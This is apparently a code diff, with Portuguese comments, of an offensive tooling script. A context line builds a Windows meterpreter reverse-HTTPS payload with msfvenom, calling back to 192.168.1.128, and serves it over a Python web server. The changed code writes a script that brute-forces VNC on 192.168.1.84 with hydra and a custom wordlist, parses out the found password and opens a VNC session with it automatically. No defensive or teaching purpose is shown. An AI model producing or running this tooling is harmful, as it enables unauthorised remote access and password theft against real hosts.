@@ -6,21 +6,16 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.128 LPORT=443 -f p
 
 python3 -m http.server 8080
 
-# Código foi reiniciado, recriando o script Python para brute force automatizado VNC
-
+# Gerando o script pronto para brute force VNC + auto connect sem dependência de /mnt/data
+script_content = """
 import subprocess
 
 ip_alvo = "192.168.1.84"  # Altere para o IP alvo
-wordlist_path = "/mnt/data/wordlist_atibaia.txt"
+wordlist_path = "wordlist_atibaia.txt"  # Assuma que o arquivo estará no mesmo diretório
 
-script_content = f"""
-import subprocess
+print(f"Iniciando brute force VNC contra {ip_alvo}...\\n")
 
-ip_alvo = "{ip_alvo}"
-wordlist_path = "{wordlist_path}"
-
-print(f"Iniciando brute force VNC contra {{ip_alvo}}...\\n")
-
+# Executa brute force via hydra
 comando = [
     "hydra",
     "-P", wordlist_path,
@@ -33,20 +28,36 @@ comando = [
 
 resultado = subprocess.run(comando, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 
-if "login:" in resultado.stdout or "host:" in resultado.stdout:
-    print("\\n====> POSSÍVEL SENHA ENCONTRADA! Resultado:")
-    print(resultado.stdout)
+# Se encontrar a senha no output do hydra
+for linha in resultado.stdout.splitlines():
+    if "login:" in linha or "host:" in linha:
+        print("\\n====> Senha encontrada! Resultado:")
+        print(linha)
+        
+        # Extrair a senha do resultado
+        partes = linha.split()
+        senha_encontrada = None
+        for i, parte in enumerate(partes):
+            if parte == "password:":
+                senha_encontrada = partes[i+1]
+                break
+
+        if senha_encontrada:
+            print(f"Tentando abrir conexão automática com vncviewer usando a senha: {senha_encontrada}")
+            subprocess.Popen(["vncviewer", ip_alvo, "-passwd", senha_encontrada])
+        else:
+            print("Senha não pôde ser extraída automaticamente, verifique a saída manualmente.")
+        break
 else:
     print("Nenhuma senha encontrada ou tentativa falhou.")
 
 print("Brute force VNC concluído.")
 """
 
-with open("/mnt/data/bruteforce_vnc.py", "w") as f:
+with open("/mnt/data/bruteforce_vnc_ready.py", "w") as f:
     f.write(script_content)
 
-print("Script Python para brute force VNC criado como 'bruteforce_vnc.py'.")
-
+print("Script pronto criado como 'bruteforce_vnc_ready.py'.")
 
 
 
